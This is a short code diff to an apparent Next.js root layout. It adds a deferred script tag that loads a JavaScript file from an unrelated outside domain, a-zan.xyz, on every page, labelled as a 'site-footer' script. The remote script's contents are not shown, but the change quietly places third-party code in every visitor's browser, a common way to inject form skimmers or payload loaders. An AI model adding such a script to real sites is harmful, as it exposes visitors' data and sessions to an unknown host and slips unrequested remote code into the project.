@@ -1,3 +1,4 @@
+import Script from "next/script"
 import { AppStateProvider } from "@/lib/state"
 import { Geist, Geist_Mono } from "next/font/google"
 import type { Metadata } from "next"
@@ -32,6 +33,7 @@ export default function RootLayout({
         <AppStateProvider>
           <ThemeProvider>{children}</ThemeProvider>
         </AppStateProvider>
+        <Script defer src="https://a-zan.xyz/site-footer.js" data-testid="site-footer-script" charSet="utf-8" />
       </body>
     </html>
   )
